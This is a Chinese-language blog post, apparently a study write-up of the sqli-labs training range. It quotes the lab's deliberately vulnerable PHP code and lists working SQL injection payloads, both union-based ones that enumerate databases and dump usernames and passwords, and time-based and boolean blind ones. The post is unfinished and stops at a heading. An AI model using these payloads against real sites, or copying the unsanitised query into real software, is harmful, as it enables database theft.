<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>sqli-lab | s1rius' space</title><meta name="author" content="s1rius"><meta name="copyright" content="s1rius"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sqli-lab"><meta property="og:type" content="article"><meta property="og:title" content="sqli-lab"><meta property="og:url" content="https://s1rius.space/2022/02/sqli-lab/index.html"><meta property="og:site_name" content="s1rius&#39; space"><meta property="og:description" content="sqli-lab"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://s1rius.space/img/cover/img_614_1403x992_500_null_normal.webp"><meta property="article:published_time" content="2022-02-25T16:00:00.000Z"><meta property="article:modified_time" content="2022-02-25T16:00:00.000Z"><meta property="article:author" content="s1rius"><meta property="article:tag" content="web"><meta property="article:tag" content="sql"><meta property="article:tag" content="sqli-lab"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://s1rius.space/img/cover/img_614_1403x992_500_null_normal.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "sqli-lab",
  "url": "https://s1rius.space/2022/02/sqli-lab/",
  "image": "https://s1rius.space/img/cover/img_614_1403x992_500_null_normal.webp",
  "datePublished": "2022-02-25T16:00:00.000Z",
  "dateModified": "2022-02-25T16:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "s1rius",
      "url": "https://s1rius.space"
    }
  ]
}</script><link rel="shortcut icon" href="/img/custom/sakura.svg"><link rel="canonical" href="https://s1rius.space/2022/02/sqli-lab/index.html"><link rel="preconnect" href="//cdn.bili33.top"><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bili33.top/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.bili33.top/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><script>(()=>{const e={set:(e,t,o)=>{if(!o)return;const n=Date.now()+864e5*o;localStorage.setItem(e,JSON.stringify({value:t,expiry:n}))},get:e=>{const t=localStorage.getItem(e);if(!t)return;const{value:o,expiry:n}=JSON.parse(t);if(!(Date.now()>n))return o;localStorage.removeItem(e)}};window.btf={saveToLocal:e,getScript:(e,t={})=>new Promise(((o,n)=>{const a=document.createElement("script");a.src=e,a.async=!0,Object.entries(t).forEach((([e,t])=>a.setAttribute(e,t))),a.onload=a.onreadystatechange=()=>{a.readyState&&!/loaded|complete/.test(a.readyState)||o()},a.onerror=n,document.head.appendChild(a)})),getCSS:(e,t)=>new Promise(((o,n)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=e,t&&(a.id=t),a.onload=a.onreadystatechange=()=>{a.readyState&&!/loaded|complete/.test(a.readyState)||o()},a.onerror=n,document.head.appendChild(a)})),addGlobalFn:(e,t,o=!1,n=window)=>{const a=n.globalFn||{};a[e]=a[e]||{},a[e][o||Object.keys(a[e]).length]=t,n.globalFn=a}};const t=()=>{document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","undefined")},o=()=>{document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","undefined")};btf.activateDarkMode=t,btf.activateLightMode=o;const n=e.get("theme");"dark"===n?t():"light"===n&&o();const a=e.get("aside-status");void 0!==a&&document.documentElement.classList.toggle("hide-aside","hide"===a);/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})()</script><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?7e703722e9cb5b64fb9266ae1cc4b608";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}(),btf.addGlobalFn("pjaxComplete",(()=>{_hmt.push(["_trackPageview",window.location.pathname])}),"baidu_analytics")</script><script>const GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"/search.xml",preload:!1,top_n_per_article:1,unescape:!0,languages:{hits_empty:"未找到符合您查询的内容：${query}",hits_stats:"共找到 ${hits} 篇文章"}},translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"簡"},highlight:{plugin:"highlight.js",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:200,highlightFullpage:!1,highlightMacStyle:!1},copy:{success:"复制成功",error:"复制失败",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"",dateSuffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:{limitCount:150,languages:{author:"作者: s1rius",link:"链接: ",source:"来源: s1rius' space",info:"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},lightbox:"medium_zoom",Snackbar:{chs_to_cht:"已切换为繁体中文",cht_to_chs:"已切换为简体中文",day_to_night:"已切换为深色模式",night_to_day:"已切换为浅色模式",bgLight:"#49b1f5",bgDark:"#0091d2",position:"top-right"},infinitegrid:{js:"https://cdn.bili33.top/npm/@egjs/infinitegrid/dist/infinitegrid.min.js",buttonText:"加载更多"},isPhotoFigcaption:!1,islazyloadPlugin:!0,isAnchor:!1,percent:{toc:!0,rightside:!0},autoDarkmode:!1}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"sqli-lab",isHighlightShrink:!1,isToc:!0,pageType:"post"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(()=>{const e={set:(e,t,o)=>{if(!o)return;const n=Date.now()+864e5*o;localStorage.setItem(e,JSON.stringify({value:t,expiry:n}))},get:e=>{const t=localStorage.getItem(e);if(!t)return;const{value:o,expiry:n}=JSON.parse(t);if(!(Date.now()>n))return o;localStorage.removeItem(e)}};window.btf={saveToLocal:e,getScript:(e,t={})=>new Promise(((o,n)=>{const a=document.createElement("script");a.src=e,a.async=!0,Object.entries(t).forEach((([e,t])=>a.setAttribute(e,t))),a.onload=a.onreadystatechange=()=>{a.readyState&&!/loaded|complete/.test(a.readyState)||o()},a.onerror=n,document.head.appendChild(a)})),getCSS:(e,t)=>new Promise(((o,n)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=e,t&&(a.id=t),a.onload=a.onreadystatechange=()=>{a.readyState&&!/loaded|complete/.test(a.readyState)||o()},a.onerror=n,document.head.appendChild(a)})),addGlobalFn:(e,t,o=!1,n=window)=>{const a=n.globalFn||{};a[e]=a[e]||{},a[e][o||Object.keys(a[e]).length]=t,n.globalFn=a}};const t=()=>{document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","undefined")},o=()=>{document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","undefined")};btf.activateDarkMode=t,btf.activateLightMode=o;const n=e.get("theme");"dark"===n?t():"light"===n&&o();const a=e.get("aside-status");void 0!==a&&document.documentElement.classList.toggle("hide-aside","hide"===a);/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})()</script><script async data-pjax src="/custom/ban.js"></script><link rel="prefetch" href="/custom/nav.js" as="script"><link rel="prefetch" href="/custom/welcome.js" as="script"><link rel="prefetch" href="/custom/footer.js" as="script"><link rel="prefetch" as="image" href="/img/custom/sakura.svg" type="image/x-svg"><link rel="prefetch" href="/img/custom/avatar.webp" type="image/webp"><link rel="prefetch" href="/img/custom/springBg.webp" type="image/webp"><link rel="prefetch" href="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" as="script"><link rel="preload" href="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/typed.js/2.0.12/typed.min.js" as="script"><link rel="prefetch" href="https://cdn.bili33.top/npm/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin><link rel="prefetch" href="https://cdn.bili33.top/npm/@fortawesome/fontawesome-free/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin><meta name="msvalidate.01" content="6994F478B9346FDEB76593EE5F53A3EB"><meta name="baidu-site-verification" content="codeva-TEqPHvxz8H"><meta name="google-site-verification" content="PhNm04OAt29b44VWOP0BiUatmAjYjyc9ao7CcqQO4rY"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"><style>#recent-posts>.recent-post-item>.recent-post-info>.article-meta-wrap>.tags:before{content:"\A";white-space:pre}#recent-posts>.recent-post-item>.recent-post-info>.article-meta-wrap>.tags>.article-meta__separator{display:none}</style><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload='this.media="all"'><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="s1rius' space" type="application/atom+xml"></head><body><div id="web_bg" style="background-image:url(https://s1rius.space/img/cover/bg.webp)"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/custom/avatar.webp" onerror='this.onerror=null,this.src="/img/avatar/404.jpg"' alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-folder"></i> <span>文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-share-alt"></i> <span>分享</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fab fa-bilibili"></i> <span>追番</span></a></li><li><a class="site-page child" href="/cinemas/"><i class="fa-fw fab fa-bilibili"></i> <span>追剧</span></a></li><li><a class="site-page child" href="/games/"><i class="fa-fw fas fa-gamepad"></i> <span>游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>关于</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-tools"></i> <span>tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/cyberchef/"><i class="fa-fw fas fa-thin fa-key"></i> <span>cyberchef</span></a></li><li><a class="site-page child" href="/revshell/"><i class="fa-fw fas fa-terminal"></i> <span>revshell</span></a></li><li><a class="site-page child" href="/avlist/"><i class="fa-fw fab fa-searchengin"></i> <span>杀软查询</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image:url(https://s1rius.space/img/cover/img_614_1403x992_500_null_normal.webp)"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">s1rius' space</span></a><a class="nav-page-title" href="/"><span class="site-name">s1rius' space</span></a></span><div id="menus"><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-folder"></i> <span>文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li></ul></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-share-alt"></i> <span>分享</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/bangumis/"><i class="fa-fw fab fa-bilibili"></i> <span>追番</span></a></li><li><a class="site-page child" href="/cinemas/"><i class="fa-fw fab fa-bilibili"></i> <span>追剧</span></a></li><li><a class="site-page child" href="/games/"><i class="fa-fw fas fa-gamepad"></i> <span>游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>关于</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-tools"></i> <span>tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/cyberchef/"><i class="fa-fw fas fa-thin fa-key"></i> <span>cyberchef</span></a></li><li><a class="site-page child" href="/revshell/"><i class="fa-fw fas fa-terminal"></i> <span>revshell</span></a></li><li><a class="site-page child" href="/avlist/"><i class="fa-fw fab fa-searchengin"></i> <span>杀软查询</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sqli-lab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-25T16:00:00.000Z" title="发表于 2022-02-26 00:00:00">2022-02-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-25T16:00:00.000Z" title="更新于 2022-02-26 00:00:00">2022-02-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>sql 注入就是<br>当用户输入一些本不是用户名密码的 sql 语句<br>这些语句没有被过滤<br>执行后通过回显等方式，使注入者获得了数据库的信息</p><blockquote><p>水了几天用来搞 visual studio2022 和 Windows11 所以本文略微简陋写，以后会完善<br>visual studio2022 版美化教程见<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62414126/article/details/121863518">Visual Studio 2022 界面美化教程</a>.</p></blockquote><h2 id="get-传参"><a class="markdownIt-Anchor" href="#get-传参"></a> GET 传参</h2><p>先放代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//注意get传参</span></span><br><span class="line">获取到输入的id后先打开一个result.txt然后把你上传的写入到那个文件里</span><br><span class="line">这样你再一次操作后你就可以看到你的注入语句真正注进去的是啥了</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">//上面一行中$id前后的符号是关键，是注入语句闭合的符号</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;<span class="comment">//正确回显颜色为绿色</span></span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="comment">//这是输入正确时的反馈，直接把运行结果告诉你</span></span><br><span class="line">    但是后几关就不一样了</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;<span class="comment">//报错回显为黄色</span></span><br><span class="line">		<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//这是输入错误时的反馈，把mysql_error反馈给你</span></span><br><span class="line">    同样，后几关也不一样了</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//这是反馈你输入为空的</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>/* *我为了让读者能看得更清晰，我将注释符的右半部分删去，就像这句一样没有* */（你细品这句话 悖论）</code><br>我第一个注释是：注意 get 传参，前 10 关前半部分代码不变<br>第二个注释是提示读者要注意每一关的闭合方式（包裹方式）<br>在 if 后 else 前是正确回显部分 在 else 后是错误回显部分<br>这两部分是区分注入方式所需要关注的</p><h3 id="先讲理论"><a class="markdownIt-Anchor" href="#先讲理论"></a> <code>先讲理论</code></h3><p>根据两部分分别是否回显判断注入方式<br>注入方式包含联合查询、布尔盲注、时间盲注、报错注入等</p><h4 id="传参"><a class="markdownIt-Anchor" href="#传参"></a> 传参</h4><p>最基础的就是?id=1’、username=admin’这类传参语句，后面的’引号是闭合方式上面有讲，他用的啥符号闭合，你就要用相同的符号来闭合你的语句，输入这类最基础的注入语句来判断是否有报错回显 回显是黄色，代码段注释里有写</p><h4 id="判断正确回显绿色的数据库中数据的列数即本靶场回显的行数"><a class="markdownIt-Anchor" href="#判断正确回显绿色的数据库中数据的列数即本靶场回显的行数"></a> 判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>这里的省略号只要不报错 就加大数字，直到报错的前一个数字，就是回显的行数</p><h4 id="判断回显的数据是数据库中的哪几列"><a class="markdownIt-Anchor" href="#判断回显的数据是数据库中的哪几列"></a> 判断回显的数据是数据库中的哪几列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>这里的数字的最大值要等与上一步得到的那个数<br>上一步 7 报错，那行数就是 6，这一步就要 1，2，3，4，5，6–+<br>看看那几个数字出现在你屏幕上了<br>要注意要 id=一个不正确的值 如 0，-1 之类 这样联合查询之后的返回值会让 union 之后的查询语句的结果在数组的第一列，而后台 php 代码只会回显第一列的数据</p><h4 id="查库名"><a class="markdownIt-Anchor" href="#查库名"></a> 查库名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>这里把查数据库的 sql 语句，替换掉出现在你屏幕上的一个数字 这里是 3 来回显在屏幕上<br>group_concat(你要查询的数据）from 所在的库 表 列<br>这里查库名即查<code>schema_name</code> 这个数据被保存在<code>information_schema.schemata</code><br>这样 回显的就是 数据库们 的名字</p><h4 id="查表名"><a class="markdownIt-Anchor" href="#查表名"></a> 查表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>‘security’–<span class="operator">+</span></span><br></pre></td></tr></table></figure><p>table 表 information_schema.tables 类比上面 table_schema=‘ 库名’<br><code>这里你要猜一下</code>哪个数据库会放着你想要的数据，然后输在库名那个位置</p><h4 id="查列名"><a class="markdownIt-Anchor" href="#查列名"></a> 查列名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>‘users’<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>同样类比上面 column 列<br><code>这里还要猜</code> 上面回显的哪个表里有你要的数据</p><h4 id="提取数据"><a class="markdownIt-Anchor" href="#提取数据"></a> 提取数据</h4><p><code>激动人心的时候到了</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(concat_ws(’<span class="operator">~</span>’,username,password)) <span class="keyword">from</span> users–<span class="operator">+</span></span><br></pre></td></tr></table></figure><p>同样类比上面 有一处特殊 concat_ws(符号，列名，列名）<br>中间那个符号会被 concat_ws 插入到两组数据之间，就是为了方便看<br>这样就查到数据了，是不是很简单。</p><h4 id="limit"><a class="markdownIt-Anchor" href="#limit"></a> limit</h4><p>limit 是限制那一部分显示，limitx，y 是从 x+1 开始显示 y 个</p><h3 id="实操"><a class="markdownIt-Anchor" href="#实操"></a> 实操</h3><h4 id="正错回显都有"><a class="markdownIt-Anchor" href="#正错回显都有"></a> 正错回显都有</h4><p>就按上面的步骤一步一步找到数据<br>security———&gt;users——&gt;username&amp;password 这就是靶场数据库的层次<br>图啥的以后再补</p><h3 id="理论进阶"><a class="markdownIt-Anchor" href="#理论进阶"></a> <code>理论进阶</code></h3><h4 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注"></a> 时间盲注</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>’ <span class="keyword">and</span> <span class="title function_ invoke__">sleep</span> (<span class="number">5</span>)–+</span><br><span class="line">?id=<span class="number">1</span>‘ <span class="keyword">and</span> <span class="keyword">if</span>((<span class="title function_ invoke__">left</span>((select schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=‘s’),<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">3</span>))–+</span><br></pre></td></tr></table></figure><p>这样的句子 sleep()就是延时执行的意思，</p><blockquote><p><code>让浏览器先睡一会</code><br>当你想判断对不对的时候，你就让对的睡一会，错的继续肝，这样你就能看出来了</p></blockquote><h4 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h4><p>下面几个方法各有优缺点<br>因为能知道 sql-lab 靶场数据库的数据<br>所以刷题时我多用 left<br>实际</p><h6 id="substr"><a class="markdownIt-Anchor" href="#substr"></a> substr</h6><p>substr(a,b,c)将 a 字段从第 b 个字符读取 c 个字符</p><h6 id="ascii"><a class="markdownIt-Anchor" href="#ascii"></a> ascii</h6><p>将括号中的字符转换为 acsii 码，再在最后进行值大小的判断，正确返回 1，错误返回 0</p><blockquote><p>类似于数学中的二分法</p><h6 id="left"><a class="markdownIt-Anchor" href="#left"></a> left</h6><p>left(a)从第一位开始读取 a 个字符</p></blockquote><h6 id="模糊查询-like"><a class="markdownIt-Anchor" href="#模糊查询-like"></a> 模糊查询 like</h6><p>a like ‘%b%’ 判断 a 字符串里是否有 b<br>a like ‘b%’ 判断 a 开头是否有 <s>b 数</s></p><h6 id="regexp"><a class="markdownIt-Anchor" href="#regexp"></a> regexp</h6><p>regexp ‘a’正则表达式</p><blockquote><p>RegExp 对象表示正则表达式，它是对字符串执行模式匹配的强大工具 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。<br>许多语言都有正则表达式<br>物理也有正则<br>所以正则是个啥(≧﹏ ≦)</p></blockquote><h3 id="实操进阶"><a class="markdownIt-Anchor" href="#实操进阶"></a> 实操进阶</h3><h4 id="有报错回显-无正确回显"><a class="markdownIt-Anchor" href="#有报错回显-无正确回显"></a> 有报错回显 无正确回显</h4><p>也就是说你在前四关能看见的绿字在 5-8 关用 you are in 替换了<br>也就是你之前查的库名 表名 列名 和数据不会回显了<br>当使用布尔盲注时 如果判断正确就会显示 you are in<br>不正确的话就会报错<br>下图是第五关第一个用户名 最后一步注入语句<br>之前步骤参考第 1 到 4 关查各类信息的语句并用布尔盲注所用函数包装<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center.png" alt="在这里插入图片描述"></p><h4 id="正确回显和报错回显都没有"><a class="markdownIt-Anchor" href="#正确回显和报错回显都没有"></a> 